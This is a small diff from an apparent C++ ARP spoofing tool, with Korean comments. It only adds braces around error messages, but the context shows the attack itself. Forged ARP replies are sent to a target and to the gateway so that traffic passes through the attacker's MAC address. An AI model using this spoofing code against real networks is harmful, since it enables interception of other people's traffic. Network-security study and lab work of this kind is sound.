@@ -219,12 +219,16 @@ void ArpSpoofer::send_arp_spoofing_packet(const SpoofTarget* target)
     // Target으로 ARP 전달
     create_arp_packet(packet, attacker_mac, target->get_mac(), gateway_ip, target->get_ip(), 2);
     if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
+    {
         cerr << "Failed to send spoof packet to target: " << pcap_geterr(handle) << "\n";
-    
+    }
     // gateway로 ARP전달
     create_arp_packet(packet, attacker_mac, gateway_mac, target->get_ip(), gateway_ip, 2);
     if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
+    {
         cerr << "Failed to send spoof packet to gateway: " << pcap_geterr(handle) << "\n";
+    }
+    
 }
 
 void ArpSpoofer::start_spoofing_all() 
